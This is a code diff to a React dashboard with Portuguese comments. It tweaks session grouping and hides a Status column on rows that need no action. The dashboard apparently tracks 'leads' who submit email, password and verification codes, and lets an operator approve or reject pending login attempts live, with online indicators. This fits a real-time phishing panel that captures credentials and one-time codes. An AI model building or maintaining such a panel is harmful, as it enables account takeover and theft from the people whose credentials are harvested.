@@ -342,7 +342,6 @@ export default function Dashboard() {
   // Sessões em andamento: têm e-mail mas não têm tentativa pendente acionável.
   // (Quem já tá em "Ao vivo" sai daqui pra evitar duplicar.)
   const activeSessions: ActiveSession[] = useMemo(() => {
-    const liveSessionIds = new Set(live.map((l) => l.session_id));
     const bySession = new Map<string, LeadRow[]>();
     for (const l of leads) {
       const arr = bySession.get(l.session_id) || [];
@@ -351,13 +350,13 @@ export default function Dashboard() {
     }
     const out: ActiveSession[] = [];
     for (const [sid, items] of bySession) {
-      if (liveSessionIds.has(sid)) continue;
       const emails = items.filter((i) => i.field_name === "email_submitted");
       if (emails.length === 0) continue;
       const sorted = [...items].sort((a, b) => a.created_at.localeCompare(b.created_at));
       const lastActivity = sorted[sorted.length - 1].created_at;
-      // Se a última atividade dessa sessão foi um código, ela já virou tentativa (ao vivo ou histórico).
-      // Só mostra aqui se a última coisa foi e-mail/senha.
+      // Mostra a sessão se a última atividade foi e-mail ou senha.
+      // Se foi código, só mostra se NÃO houver tentativa pendente nem ação dela
+      // (ou seja, só pra sessões que voltaram a digitar e-mail depois).
       const lastField = sorted[sorted.length - 1].field_name;
       if (lastField === "code_submitted") continue;
       const email = [...emails].sort((a, b) => a.created_at.localeCompare(b.created_at)).pop()!.value;
@@ -375,7 +374,7 @@ export default function Dashboard() {
       });
     }
     return out.sort((a, b) => b.lastActivity.localeCompare(a.lastActivity));
-  }, [leads, live]);
+  }, [leads]);
 
   const send = async (row: AttemptRow, action: "approve" | "reject") => {
     setBusy(`${row.key}-${action}`);
@@ -660,7 +659,7 @@ function AttemptsTable({
       <table className="w-full text-sm">
         <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
           <tr>
-            <th className="px-4 py-3 text-left font-medium">Status</th>
+            {actionable && <th className="px-4 py-3 text-left font-medium">Status</th>}
             <th className="px-4 py-3 text-left font-medium">Hora</th>
             <th className="px-4 py-3 text-left font-medium">
               <span className="inline-flex items-center gap-1">
@@ -698,9 +697,11 @@ function AttemptsTable({
                   actionable ? "bg-primary/5" : "hover:bg-muted/30"
                 }`}
               >
-                <td className="whitespace-nowrap px-4 py-3 text-xs">
-                  <StatusDot online={isOnline} />
-                </td>
+                {actionable && (
+                  <td className="whitespace-nowrap px-4 py-3 text-xs">
+                    <StatusDot online={isOnline} />
+                  </td>
+                )}
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                   {formatTime(row.codeAt)}
                 </td>
